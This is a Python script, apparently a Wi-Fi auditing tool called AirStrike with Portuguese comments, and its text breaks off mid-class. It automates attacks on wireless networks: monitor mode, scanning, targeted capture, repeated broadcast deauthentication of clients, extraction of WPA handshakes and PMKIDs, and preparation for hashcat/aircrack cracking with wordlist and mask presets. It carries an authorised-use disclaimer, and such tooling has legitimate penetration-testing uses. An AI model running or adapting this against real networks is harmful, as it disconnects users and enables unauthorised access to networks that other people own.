#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AirStrike: auditoria automatizada de redes Wi-Fi para Kali Linux.

Fluxo completo (aircrack-ng suite + hcxtools + hashcat):
  1) airmon-ng  -> coloca a interface em modo monitor (SEM matar a rede)
  2) airodump-ng -> varre as redes ao alcance e mostra uma tabela
  3) airmon-ng  -> mata os processos de rede so na hora da captura
  4) airodump-ng -> captura pacotes da rede alvo (canal + BSSID)
  5) aireplay-ng -> teste de desconexão (opcional; pode usar uma 2a antena
       so para injecao, --iface-inject, estilo wifite)
  6) airmon-ng  -> para a captura e restaura a interface e a internet
  7) aircrack-ng / hashcat -> quebra offline do handshake (internet ja de volta)
       (hcxpcapngtool + hashcat: alternativa PMKID, hashes no formato 22000)

USE APENAS EM REDES PRÓPRIAS OU COM AUTORIZAÇÃO EXPLÍCITA DO RESPONSÁVEL.

Requisitos (Kali Linux): aircrack-ng suite, iw, root (sudo).
Nenhuma dependência externa de Python (somente biblioteca padrão).
"""

import argparse
import json
import os
import re
import shlex
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------

__appname__ = "AirStrike"
__version__ = "1.0"

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"
BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
KEY_FOUND_RE = re.compile(r"KEY FOUND!\s*\[\s*(.+?)\s*\]")

# Frentes de quebra (modo mascara hashcat -a 3).
# Cada frente: (nome, mascara, charsets custom (-1..-4) ou None, increment?)
# Tokens: ?d digitos, ?l minusculas, ?s especiais, ?a todos imprimiveis
MASK_PRESETS = {
    "numeric6": [("numeric6", "?d" * 6, None, False)],
    "numeric7": [("numeric7", "?d" * 7, None, False)],
    "numeric8": [("numeric8", "?d" * 8, None, False)],
    "numeric9": [("numeric9", "?d" * 9, None, False)],
    "numeric10": [("numeric10", "?d" * 10, None, False)],
    "factory": [("factory 4d+4l", "?d?d?d?d?l?l?l?l", None, False),
                ("factory 4l+4d", "?l?l?l?l?d?d?d?d", None, False),
                ("factory 6d+2l", "?d?d?d?d?d?d?l?l", None, False)],
    "alnum8": [("alnum8", "?1" * 8, {"-1": "?l?u?d"}, False)],
}

# Tamanho do charset de cada token do hashcat (para calcular o espaco de busca)
CHARSET_SIZES = {"?d": 10, "?l": 26, "?u": 26, "?s": 33, "?a": 95, "?b": 256}

# Cores (desativadas automaticamente se a saída não for um terminal)
USE_COLOR = sys.stdout.isatty()


class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"


def paint(text: str, color: str) -> str:
    if not USE_COLOR:
        return str(text)
    return f"{color}{text}{Color.RESET}"


def info(msg: str) -> None:
    print(paint("[*]", Color.CYAN), msg)


def ok(msg: str) -> None:
    print(paint("[+]", Color.GREEN), msg)


def warn(msg: str) -> None:
    print(paint("[!]", Color.YELLOW), msg)


def err(msg: str) -> None:
    print(paint("[-]", Color.RED), msg, file=sys.stderr)


# ---------------------------------------------------------------------------
# Banner (estilo Wifite): letras em blocos coloridas
# ---------------------------------------------------------------------------

_BANNER_GLYPHS = {
    "A": [" ### ", "#   #", "#####", "#   #", "#   #", "#   #"],
    "I": ["#####", "  #  ", "  #  ", "  #  ", "  #  ", "#####"],
    "R": ["#### ", "#   #", "#### ", "#  # ", "#   #", "#   #"],
    "S": ["#####", "#    ", "#####", "    #", "    #", "#####"],
    "T": ["#####", "  #  ", "  #  ", "  #  ", "  #  ", "  #  "],
    "K": ["#   #", "#  # ", "###  ", "#  # ", "#   #", "#   #"],
    "E": ["#####", "#    ", "#### ", "#    ", "#    ", "#####"],
}


def render_banner(text="AirStrike"):
    """Monta o texto em blocos. Devolve as 6 linhas (ou None)."""
    glyphs = [_BANNER_GLYPHS[c] for c in text.upper() if c in _BANNER_GLYPHS]
    if not glyphs:
        return None
    return [" ".join(g[r] for g in glyphs) for r in range(6)]


def print_banner():
    """Imprime o banner do AirStrike ("Air" ciano + "Strike" vermelho)."""
    linhas = render_banner(__appname__)
    if not linhas:
        linhas = [__appname__]
    n_air = 3  # letras "Air" em ciano, o restante em vermelho
    largura_air = n_air * 5 + (n_air - 1)
    print(paint("  " + "-" * 53, Color.CYAN))
    for linha in linhas:
        if len(linha) > largura_air:
            print("  " + paint(linha[:largura_air], Color.CYAN + Color.BOLD)
                  + " " + paint(linha[largura_air + 1:], Color.RED + Color.BOLD))
        else:
            print("  " + paint(linha, Color.CYAN + Color.BOLD))
    print(paint("  " + "-" * 53, Color.CYAN))
    print("  ", paint(f"{__appname__} {__version__}", Color.BOLD),
          "- auditoria automatizada de redes Wi-Fi (aircrack-ng + hcxtools + hashcat)")
    print("  ", paint("use somente em redes proprias ou com autorizacao explicita", Color.YELLOW))
    print()


# ---------------------------------------------------------------------------
# Utilitários de subprocesso
# ---------------------------------------------------------------------------

def run(cmd, timeout=None, stdin=subprocess.DEVNULL):
    """Executa um comando e devolve (codigo_saida, saida_completa)."""
    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=stdin,
            timeout=timeout,
            encoding="utf-8",
            errors="replace",
        )
        return proc.returncode, proc.stdout or ""
    except FileNotFoundError:
        return 127, f"comando nao encontrado: {cmd[0]}"
    except subprocess.TimeoutExpired as exc:
        out = ""
        if exc.stdout:
            out = exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode("utf-8", "replace")
        return -1, out


def require_tools():
    faltando = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not shutil.which(t)]
    if not shutil.which("iw"):
        warn("comando 'iw' nao encontrado; a deteccao de interfaces pode falhar")
    if faltando:
        err("ferramentas ausentes: " + ", ".join(faltando))
        err("instale a suite com: sudo apt install aircrack-ng")
        sys.exit(1)
    if not shutil.which("hcxpcapngtool"):
        warn("hcxpcapngtool ausente (hcxtools): ataque PMKID desativado | sudo apt install hcxtools")
    if not shutil.which("hashcat"):
        warn("hashcat ausente: quebra via PMKID/22000 indisponivel | sudo apt install hashcat")


# ---------------------------------------------------------------------------
# Interfaces sem fio / modo monitor
# ---------------------------------------------------------------------------

def list_ifaces_with_type():
    """Devolve um dict {nome: tipo} das interfaces wireless (via iw dev)."""
    ifaces = {}
    _, out = run(["iw", "dev"])
    atual = None
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\S+)", line)
        if m:
            atual = m.group(1)
            continue
        m = re.match(r"\s*type\s+(\S+)", line)
        if m and atual:
            ifaces[atual] = m.group(1)
            atual = None
    return ifaces


def iface_base(nome):
    """wlan0mon -> wlan0: nome base de uma interface em modo monitor."""
    if nome and nome.endswith("mon"):
        return nome[:-3]
    return nome


def chipset_do_iface(nome):
    """Driver/chipset de uma interface (ex.: 'mt76x2u, MediaTek Inc. MT7612U')."""
    partes = []
    try:
        dev = os.path.realpath(os.path.join("/sys/class/net", nome, "device"))
        drv = os.path.basename(os.readlink(os.path.join(dev, "driver")))
        if drv and drv != nome:
            partes.append(drv)
        with open(os.path.join(dev, "modalias"), encoding="utf-8") as fh:
            modalias = fh.read().strip()
        m = re.search(r"usb:v([0-9A-Fa-f]{4})p([0-9A-Fa-f]{4})", modalias)
        if m:
            chave = "%s:%s" % (m.group(1).lower(), m.group(2).lower())
            rc, out = run(["lsusb"])
            for linha in out.splitlines():
                if chave in linha.lower():
                    descr = linha.split(chave, 1)[1].strip()
                    if descr:
                        partes.append(descr)
                    break
    except OSError:
        pass
    return ", ".join(partes)


def find_wireless_iface():
    """Procura uma interface wireless em modo managed (para o modo monitor)."""
    ifaces = list_ifaces_with_type()
    for nome, tipo in ifaces.items():
        if tipo == "managed":
            return nome
    for nome, tipo in ifaces.items():
        if tipo == "monitor":
            return nome  # ja esta em monitor; tratado depois
    return None


def escolher_adaptadores(args):
    """No estilo wifite: mostra os adaptadores e pergunta qual usar.

    Com um so adaptador (ou sem terminal interativo) nao pergunta nada.
    Preenche args.iface (captura) e args.iface_inject (injecao/deauth)
    quando o usuario escolhe.
    """
    ifaces = list_ifaces_with_type()
    if not ifaces:
        return
    chips = {n: chipset_do_iface(n) for n in ifaces}

    def rotulo(n):
        chip = chips.get(n)
        return f"{n} ({ifaces[n]}, {chip})" if chip else f"{n} ({ifaces[n]})"

    lista = ", ".join(rotulo(n) for n in sorted(ifaces))
    info(f"adaptadores sem fio detectados: {lista}")
    nomes = sorted(ifaces)
    if not sys.stdin.isatty() or len(nomes) < 2:
        return
    if not args.iface:
        try:
            resp = input(f"Adaptador para CAPTURA (Enter = auto; opcoes: "
                         f"{', '.join(rotulo(n) for n in nomes)}): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            resp = ""
        if resp and resp in nomes:
            args.iface = resp
        elif resp:
            warn(f"'{resp}' nao existe; seguindo com auto-deteccao")
    if not args.iface_inject:
        base_captura = iface_base(args.iface) if args.iface else None
        outras = [n for n in nomes if iface_base(n) != base_captura]
        if not outras:
            return
        try:
            resp = input(f"Adaptador para INJECAO/deauth "
                         f"(Enter = mesmo da captura; opcoes: "
                         f"{', '.join(rotulo(n) for n in outras)}): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            resp = ""
        if resp and resp in nomes:
            args.iface_inject = resp
        elif resp:
            warn(f"'{resp}' nao existe; injecao no mesmo adaptador da captura")


def setup_monitor(iface=None, fatal=True, matar_processos=True):
    """Ativa o modo monitor. Devolve (iface_monitor, matou_processos).

    Com fatal=False devolve None em vez de encerrar o programa; usado pela
    recuperacao automatica do adaptador. Com matar_processos=False pula o
    'airmon-ng check kill' (a internet de outras interfaces, como cabo ou
    USB-tether, segue ativa durante a varredura). Se o monitor nao subir
    assim, tenta de novo com o 'check kill'.
    """
    if iface is None:
        iface = find_wireless_iface()
    if iface is None:
        if not fatal:
            return None
        err("nenhuma interface wireless encontrada (antena conectada? driver instalado?)")
        sys.exit(1)

    ifaces_antes = list_ifaces_with_type()
    if ifaces_antes.get(iface) == "monitor":
        ok(f"{iface} ja esta em modo monitor")
        return iface, False

    if matar_processos:
        info("encerrando processos que conflitam com o modo monitor (airmon-ng check kill)")
        run(["airmon-ng", "check", "kill"])
    else:
        info("subindo o monitor sem matar a rede (sem 'airmon-ng check kill')")

    info(f"ativando modo monitor em {iface} (airmon-ng start)")
    rc, out = run(["airmon-ng", "start", iface], timeout=30)

    # Tenta extrair o nome da interface monitor do output do airmon-ng
    m = re.search(r"monitor mode enabled on ([^\s)]+)", out)
    if m:
        return m.group(1), True
    m = re.search(r"monitor mode vif enabled for \[phy\d+\]\S+ on \[phy\d+\]([^\s)]+)", out)
    if m:
        return m.group(1), True

    # Fallback: compara as interfaces antes e depois
    time.sleep(2)
    for nome, tipo in list_ifaces_with_type().items():
        if tipo == "monitor" and nome not in ifaces_antes:
            return nome, True
    if ifaces_antes.get(iface) == "monitor":
        return iface, True

    if not matar_processos:
        # Sem o 'check kill' o NetworkManager pode ter atrapalhado; agora sim
        # encerra os processos e tenta mais uma vez.
        warn("monitor nao confirmado sem o 'check kill'; repetindo com ele...")
        run(["airmon-ng", "check", "kill"])
        return setup_monitor(iface, fatal=fatal, matar_processos=True)
    if not fatal:
        return None
    err("nao foi possivel confirmar o modo monitor")
    err("saida do airmon-ng:\n" + out)
    sys.exit(1)


def restore_setup(monitor_ifaces, matou_processos):
    """Para o(s) modo(s) monitor e restaura o NetworkManager se precisarmos."""
    if isinstance(monitor_ifaces, str):
        monitor_ifaces = [monitor_ifaces]
    monitor_ifaces = [m for m in (monitor_ifaces or []) if m]
    for monitor_iface in monitor_ifaces:
        info(f"parando modo monitor ({monitor_iface})")
        run(["airmon-ng", "stop", monitor_iface], timeout=30)
    if matou_processos:
        info("restaurando servicos de rede")
        run(["systemctl", "start", "NetworkManager"], timeout=30)
        run(["systemctl", "start", "wpa_supplicant"], timeout=30)
    # Volta as interfaces para managed (caso o airmon-ng tenha deixado parada)
    ifaces = list_ifaces_with_type()
    for monitor_iface in monitor_ifaces:
        base = iface_base(monitor_iface)
        if base and ifaces.get(base) != "managed":
            run(["ip", "link", "set", base, "up"], timeout=15)
            run(["iw", "dev", base, "set", "type", "managed"], timeout=15)


class Adapter:
    """Controla a interface em modo monitor e religa o adaptador sozinho.

    Se a placa cair no meio do teste (USB removido e recolocado, driver
    reiniciado, modo monitor perdido), o AirStrike detecta em tempo real,
    espera a interface voltar, detecta o nome automaticamente e roda de
    novo o 'airmon-ng check kill' + 'airmon-ng start'.
    """

    def __init__(self, preferred=None):
        self.preferred = preferred   # nome base escolhido pelo usuario (--iface)
        self.monitor = None          # nome da interface em modo monitor
        self.matou_processos = False  # se ja matamos NetworkManager etc.

    def setup(self):
        """Ativa o modo monitor na inicializacao sem matar os servicos de rede."""
        resultado = setup_monitor(self.preferred, fatal=True, matar_processos=False)
        self.monitor, matou = resultado
        self.matou_processos = self.matou_processos or matou
        self._desconecta_gerenciada()
        return self.monitor

    def _desconecta_gerenciada(self):
        """Desconecta a interface gerenciada sem parar o NetworkManager.

        Libera a placa para variar de canal na varredura, mas mantem os
        servicos de rede vivos (internet por cabo/USB-tether segue ativa).
        """
        base = iface_base(self.monitor)
        if not base or list_ifaces_with_type().get(base) != "managed":
            return
        run(["nmcli", "dev", "disconnect", base], timeout=15)

    def alive(self):
        """True se a interface de monitor ainda existe e esta em modo monitor."""
        if not self.monitor:
            return False
        return list_ifaces_with_type().get(self.monitor) == "monitor"

    def recover(self, timeout=60):
        """Espera o adaptador voltar e religa o modo monitor. Devolve bool."""
        warn("detectei que o adaptador ou o modo monitor caiu; procurando a interface...")
        fim = time.time() + timeout
        while time.time() < fim:
            ifaces = list_ifaces_with_type()
            if ifaces.get(self.monitor) == "monitor":
                ok(f"{self.monitor} voltou por conta propria")
                return True
            # A placa voltou como managed (replug de USB)? religa o monitor
            candidata = None
            if self.preferred and ifaces.get(self.preferred) == "managed":
                candidata = self.preferred
            else:
                candidata = find_wireless_iface()
            if candidata and ifaces.get(candidata) == "managed":
                novo = setup_monitor(candidata, fatal=False)
                if novo:
                    self.monitor, matou = novo
                    self.matou_processos = self.matou_processos or matou
                    ok(f"adaptador religado automaticamente: {self.monitor} "
                       f"(interface detectada: {candidata})")
                    return True
            time.sleep(3)
        err(f"o adaptador nao voltou em {timeout}s")
        return False


# ---------------------------------------------------------------------------
# Varredura de redes (airodump-ng -> CSV)
# ---------------------------------------------------------------------------

def parse_airodump_csv(path):
    """Le um CSV do airodump-ng. Devolve (redes, clientes).

    redes:  lista de dicts (bssid, channel, privacy, cipher, auth, power,
            ivs, essid, clients)
    clientes: lista de dicts (station, bssid)
    """
    redes = []
    clientes = []
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            linhas = fh.read().splitlines()
    except OSError:
        return redes, clientes

    secao = None
    for line in linhas:
        s = line.strip()
        if not s:
            continue
        if s.startswith("BSSID,"):
            secao = "net"
            continue
        if s.startswith("Station MAC,"):
            secao = "sta"
            continue
        if s.lower().startswith("airodump"):
            continue

        campos = [c.strip() for c in line.split(",")]

        if secao == "net":
            if len(campos) < 13 or not BSSID_RE.match(campos[0]):
                continue
            # ESSID pode conter virgulas (e espacos): junta os campos brutos do
            # miolo e descarta a ultima coluna (Key), que vem depois dele.
            brutos = line.split(",")
            if len(brutos) >= 15:
                essid = ",".join(brutos[13:-1]).strip()
            elif len(brutos) == 14:
                essid = brutos[13].strip()
            else:
                essid = ""
            redes.append({
                "bssid": campos[0].upper(),
                "channel": campos[3],
                "privacy": campos[5] if len(campos) > 5 else "",
                "cipher": campos[6] if len(campos) > 6 else "",
                "auth": campos[7] if len(campos) > 7 else "",
                "power": campos[8] if len(campos) > 8 else "",
                "ivs": _int(campos[10] if len(campos) > 10 else "0"),
                "essid": essid,
                "clients": 0,
            })
        elif secao == "sta":
            if len(campos) < 6 or not BSSID_RE.match(campos[0]):
                continue
            clientes.append({
                "station": campos[0].upper(),
                "bssid": campos[5].upper(),
            })

    contagem = {}
    for c in clientes:
        contagem[c["bssid"]] = contagem.get(c["bssid"], 0) + 1
    for r in redes:
        r["clients"] = contagem.get(r["bssid"], 0)

    return redes, clientes


def _int(texto):
    try:
        return int(str(texto).strip())
    except (TypeError, ValueError):
        return 0


def _power_int(texto):
    v = _int(texto)
    return v if v != 0 else -999


def scan_networks(monitor_iface, seconds, out_dir):
    """Roda o airodump-ng por N segundos e devolve as redes encontradas."""
    prefix = os.path.join(out_dir, "scan_%s" % time.strftime("%Y%m%d_%H%M%S"))
    cmd = ["airodump-ng", "--output-format", "csv", "-w", prefix, monitor_iface]
    info(f"varrendo redes por {seconds}s (ou ate Ctrl+C para parar e escolher)")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except OSError as exc:
        err(f"falha ao iniciar o airodump-ng: {exc}")
        sys.exit(1)
    try:
        time.sleep(seconds)
    except KeyboardInterrupt:
        warn("varredura interrompida; mostrando as redes ja capturadas...")
    finally:
        _stop_process(proc)

    csv_path = prefix + "-01.csv"
    if not os.path.exists(csv_path):
        err(f"o airodump-ng nao gerou o arquivo {csv_path}")
        sys.exit(1)
    redes, _ = parse_airodump_csv(csv_path)
    redes.sort(key=lambda r: _power_int(r["power"]), reverse=True)
    return redes


def print_networks(redes):
    if not redes:
        warn("nenhuma rede encontrada. Aumente o tempo (--scan-time) ou verifique a antena.")
        return
    print()
    print(paint("  #   BSSID              CH   POW    ENC            ESSID", Color.BOLD))
    print("  " + "-" * 68)
    for i, r in enumerate(redes, 1):
        essid = r["essid"] or paint("<oculta>", Color.YELLOW)
        enc = (r["privacy"] or "?").strip()
        print("  %-3d %-18s %-4s %-6s %-14s %s" % (
            i, r["bssid"], r["channel"], r["power"] or "?", enc, essid))
    print()


# ---------------------------------------------------------------------------
# Captura dirigida + desconexão
# ---------------------------------------------------------------------------

def start_capture(monitor_iface, bssid, channel, out_dir, log_path):
    prefix = os.path.join(out_dir, "captura_%s" % time.strftime("%Y%m%d_%H%M%S"))
    cmd = ["airodump-ng", "--bssid", bssid, "-c", str(channel),
           "--output-format", "pcap,csv", "-w", prefix, monitor_iface]
    info(f"capturando a rede {bssid} (canal {channel}): {' '.join(cmd)}")
    try:
        log_fh = open(log_path, "a", encoding="utf-8")
    except OSError:
        log_fh = subprocess.DEVNULL
    proc = subprocess.Popen(cmd, stdout=log_fh, stderr=subprocess.STDOUT)
    time.sleep(3)
    if proc.poll() is not None:
        err("o airodump-ng encerrou imediatamente; verifique o canal e a interface")
        err(f"log: {log_path}")
        return None, prefix
    return proc, prefix


def _stop_process(proc, timeout=8):
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.send_signal(signal.SIGINT)  # Ctrl+C: finaliza gravando os arquivos
    except Exception:
        pass
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


def read_capture_stats(prefix, bssid):
    """Le o CSV da captura dirigida. Devolve (ivs, clientes_associados)."""
    csv_path = prefix + "-01.csv"
    redes, clientes = parse_airodump_csv(csv_path)
    for r in redes:
        if r["bssid"] == bssid.upper():
            assoc = len([c for c in clientes if c["bssid"] == bssid.upper()])
            return r["ivs"], assoc
    return 0, len([c for c in clientes if c["bssid"] == bssid.upper()])


def send_deauth(monitor_iface, bssid, count, timeout=15):
    """Teste de desconexão (aireplay-ng -0 N -a BSSID)."""
    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, monitor_iface]
    info(f"enviando {count} pacotes de desautenticacao: {' '.join(cmd)}")
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(min(timeout, 10))
    except OSError as exc:
        warn(f"nao foi possivel executar o aireplay-ng: {exc}")
        return
    _stop_process(proc)


def test_injection(monitor_iface, bssid=None, essid=None, channel=None, timeout=20):
    """Testa se a placa injeta pacotes (aireplay-ng -9). Devolve bool.

    Sem injecao o deauth nao funciona; avisar antes de gastar minutos de
    captura a toa.
    """
    if channel and str(channel).isdigit():
        run(["iw", "dev", monitor_iface, "set", "channel", str(channel)])
    cmd = ["aireplay-ng", "-9"]
    if essid:
        cmd += ["-e", essid]
        if bssid:
            cmd += ["-a", bssid]
    cmd.append(monitor_iface)
    info("testando injecao de pacotes (aireplay-ng -9)...")
    rc, out = run(cmd, timeout=timeout)
    if "injection is working" in out.lower():
        ok("injecao de pacotes confirmada")
        return True
    warn("injecao de pacotes NAO confirmada: o deauth pode nao funcionar")
    warn("  a captura segue mesmo assim (um cliente pode conectar sozinho),")
    warn("  mas se nao sair handshake, teste outra antena/placa com injecao")
    return False


def setup_injection(args, adapter, channel):
    """Prepara o adaptador de injecao (estilo wifite: pode ser uma 2a antena).

    Devolve o nome da interface em monitor para o deauth. Se for o mesmo
    adaptador da captura (ou nao houver/nao subir), devolve o de captura.
    """
    captura = adapter.monitor
    pedido = args.iface_inject
    if not pedido or iface_base(pedido) == iface_base(captura):
        return captura
    info(f"preparando o adaptador de injecao ({pedido})...")
    resultado = setup_monitor(pedido, fatal=False, matar_processos=False)
    if not resultado:
        warn(f"nao consegui subir monitor em {pedido}; injecao sera por {captura}")
        return captura
    inj = resultado[0]
    if iface_base(inj) == iface_base(captura):
        return captura
    run(["iw", "dev", inj, "set", "channel", str(channel)])
    ok(f"deauth/injecao por {inj} (canal {channel}) | captura por {captura}")
    return inj


def _recover_adapter(adapter, cap, bssid, channel, out_dir, log_path):
    """Religa o adaptador e reinicia a captura. Devolve True se conseguiu."""
    warn("o adaptador ou o modo monitor caiu; religando automaticamente...")
    _stop_process(cap["proc"])
    cap["proc"] = None
    if not adapter.recover():
        return False
    proc, prefix = start_capture(adapter.monitor, bssid, channel, out_dir, log_path)
    if proc is None:
        return False
    cap["proc"], cap["prefix"] = proc, prefix
    ok(f"captura retomada em {adapter.monitor} (arquivo novo: {prefix}-01.cap)")
    return True


def wait_handshake(adapter, cap, bssid, channel, out_dir, log_path,
                   capture_time, deauth_count, deauth_interval, iv_target,
                   inject_iface=None):
    """Loop da captura: faz deauth periodico e procura handshake/PMKID.

    Vigia o adaptador a cada iteracao: se a placa, o modo monitor ou o
    airodump-ng cair, roda de novo o 'airmon-ng check kill' +
    'airmon-ng start' com o nome detectado e reinicia a captura sozinho.

    cap e um dict {"proc", "prefix"} atualizado quando a captura reinicia.
    Devolve "handshake", "pmkid", "ivs" (WEP) ou "none".
    """
    redes, _ = parse_airodump_csv(cap["prefix"] + "-01.csv")
    enc = ""
    for r in redes:
        if r["bssid"] == bssid.upper():
            enc = (r["privacy"] or "").upper()
            break

    wep = "WEP" in enc
    inicio = time.time()
    ultimo_deauth = 0.0
    ultimo_status = 0.0
    aviso_sem_cliente = False

    info(f"aguardando ate {capture_time}s por {'IVs suficientes (WEP)' if wep else 'handshake/PMKID (WPA)'}... (Ctrl+C para pular)")
    try:
        while True:
            elapsed = time.time() - inicio
            if elapsed > capture_time:
                break

            # Vigia o adaptador e o airodump antes de qualquer outra coisa
            airodump_caiu = cap["proc"] is not None and cap["proc"].poll() is not None
            if airodump_caiu or not adapter.alive():
                if not _recover_adapter(adapter, cap, bssid, channel, out_dir, log_path):
                    return "none"
                continue

            ivs, clientes = read_capture_stats(cap["prefix"] + "-01.csv", bssid)

            if deauth_count > 0 and not wep:
                if inject_iface and list_ifaces_with_type().get(inject_iface) != "monitor":
                    warn(f"adaptador de injecao ({inject_iface}) saiu do monitor; usando {adapter.monitor}")
                    inject_iface = adapter.monitor
                if time.time() - ultimo_deauth >= deauth_interval:
                    # Deauth broadcast mesmo sem cliente visivel no CSV:
                    # cliente ocioso (economia de energia) nao aparece na
                    # lista, mas o deauth (-a BSSID) o alcana do mesmo jeito.
                    if clientes == 0 and not aviso_sem_cliente:
                        info("nenhum cliente visivel no CSV; enviando deauth broadcast mesmo assim")
                        aviso_sem_cliente = True
                    alvo_inj = inject_iface or adapter.monitor
                    if alvo_inj != adapter.monitor:
                        # mantem a antena de injecao no canal do alvo
                        run(["iw", "dev", alvo_inj, "set", "channel", str(channel)])
                    send_deauth(alvo_inj, bssid, deauth_count)
                    ultimo_deauth = time.time()

            if wep:
                if time.time() - ultimo_status >= 10:
                    info(f"[{int(elapsed):>3}s] IVs capturados: {ivs} (alvo: {iv_target}) | clientes: {clientes}")
                    ultimo_status = time.time()
                if ivs >= iv_target:
                    ok(f"quantidade de IVs suficiente ({ivs})")
                    return "ivs"
            else:
                if time.time() - ultimo_status >= 15:
                    arquivo_cap = cap["prefix"] + "-01.cap"
                    hs = has_handshake(arquivo_cap, bssid)
                    pmkid_n = eapol_n = 0
                    if hs is not True:
                        r = extract_22000(arquivo_cap, cap["prefix"] + "_check.22000", bssid)
                        if r:
                            pmkid_n, eapol_n = r
                    if hs is True or eapol_n > 0:
                        ok("handshake WPA capturado!")
                        return "handshake"
                    if pmkid_n > 0:
                        ok(f"PMKID capturado ({pmkid_n}x)!")
                        return "pmkid"
                    info(f"[{int(elapsed):>3}s] IVs: {ivs} | clientes: {clientes} | "
                         f"handshake: {'sim' if hs else 'nao'} | PMKID: {pmkid_n}")
                    ultimo_status = time.time()

            time.sleep(2)
    except KeyboardInterrupt:
        warn("captura interrompida pelo usuario")

    return "none"


def has_handshake(cap_file, bssid):
    """Verifica se o .cap contem handshake WPA do alvo.

    True / False quando consegue determinar; None quando nao foi possivel.
    """
    if not os.path.exists(cap_file):
        return False
    # /dev/null funciona como lista de senhas vazia: se existir handshake o
    # aircrack-ng reclama da "senha nao encontrada"; senao, ele avisa que nao
    # ha handshakes validos.
    rc, out = run(["aircrack-ng", "-a2", "-b", bssid, "-w", "/dev/null", cap_file], timeout=20)
    baixo = out.lower()
    if "no valid wpa handshake" in baixo or "no valid handshakes" in baixo:
        return False
    if "key found" in baixo or "passphrase not in dictionary" in baixo:
        return True
    # Fallback: lista de redes do aircrack-ng mostra "(1 handshake)"
    m = re.search(r"(\d+)\s+handshake", out)
    if m:
        return int(m.group(1)) > 0
    return None


# ---------------------------------------------------------------------------
# PMKID (hcxpcapngtool + hashcat -m 22000)
# ---------------------------------------------------------------------------

def count_hashes_in_22000(path, bssid=None):
    """Conta hashes PMKID (WPA*01*) e EAPOL (WPA*02*) de um arquivo .22000.

    Se bssid for informado, conta somente as linhas daquele AP (no formato
    22000 o MAC do AP aparece sem dois-pontos, no campo 4).
    Devolve (pmkid, eapol).
    """
    pmkid = eapol = 0
    alvo = bssid.replace(":", "").lower() if bssid else None
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                campos = line.strip().upper().split("*")
                if len(campos) < 5 or campos[0] != "WPA":
                    continue
                if alvo and campos[3].lower() != alvo:
                    continue
                if campos[1] == "01":
                    pmkid += 1
                elif campos[1] == "02":
                    eapol += 1
    except OSError:
        pass
    return pmkid, eapol


def extract_22000(cap_file, out_file, bssid=None):
    """Extrai handshakes/PMKID do .cap para o formato hashcat 22000.

    Usa o hcxpcapngtool (hcxtools). Aceita um .cap ou uma lista deles
    (o airodump pode ter dividido a sessao em -01.cap, -02.cap, ...).
    Devolve (pmkid, eapol) do AP alvo, ou None se o hcxpcapngtool nao
    estiver instalado.
    """
    if not shutil.which("hcxpcapngtool"):
        return None
    entradas = [cap_file] if isinstance(cap_file, str) else list(cap_file)
    entradas = [e for e in entradas if os.path.exists(e)]
    if not entradas:
        return (0, 0)
    try:
        if os.path.exists(out_file):
            os.remove(out_file)  # evita acumular hashes de execucoes antigas
    except OSError:
        pass
    run(["hcxpcapngtool", "-o", out_file] + entradas, timeout=120)
    if not os.path.exists(out_file):
        return (0, 0)
    return count_hashes_in_22000(out_file, bssid)


def _fmt_num(n):
    """1234567 -> '1.234.567'."""
    try:
        return "{:,}".format(int(n)).replace(",", ".")
    except (TypeError, ValueError):
        return str(n)


def _fmt_vel(n):
    """4036 -> '4.0 kH/s'."""
    try:
        n = float(n)
    except (TypeError, ValueError):
        return "?"
    if n >= 1e9:
        return "%.1f GH/s" % (n / 1e9)
    if n >= 1e6:
        return "%.1f MH/s" % (n / 1e6)
    if n >= 1e3:
        return "%.1f kH/s" % (n / 1e3)
    return "%.0f H/s" % n


class PainelHashcat:
    """Painel ao vivo da quebra, alimentado pelo --status-json do hashcat.

    Com rich e terminal interativo: painel permanente com barra de
    progresso, contador de senhas, velocidade, ETA e temperatura.
    Sem rich, mas em terminal: contador em uma linha (\\r).
    Sem terminal (logs, pipes): desligado — o filtro de texto assume.
    """

    def __init__(self, rotulo=None, ataque=None, total=None):
        self.rotulo = rotulo
        self.ataque = ataque
        self.total = total
        self.estado = {}
        self._aviso_linhas = []
        self._live = None
        self._console = None
        self._rich = False
        try:
            if sys.stdout.isatty():
                from rich.console import Console
                from rich.live import Live
                self._Console, self._Live = Console, Live
                self._console = Console(highlight=False)
                self._rich = True
        except ImportError:
            self._rich = False
        self.ativo = sys.stdout.isatty()

    # -- alimentacao ------------------------------------------------------
    def linha_json(self, obj):
        # no --status-json do hashcat os campos ficam no nivel de cima;
        # a chave "status" e um escalar (estado da sessao), nao um dict
        self.estado = obj if isinstance(obj, dict) else {}
        if self._live is not None:
            self._live.update(self._render())

    def aviso(self, texto):
        if self._live is not None:
            self._live.console.print(texto, style="yellow", highlight=False)
        else:
            print(texto)

    # -- contexto ---------------------------------------------------------
    def __enter__(self):
        if self._rich and self.ativo:
            self._live = self._Live(self._render(), console=self._console,
                                    refresh_per_second=2, transient=False)
            self._live.__enter__()
        return self

    def __exit__(self, *exc):
        if self._live is not None:
            self._live.__exit__(*exc)
        return False

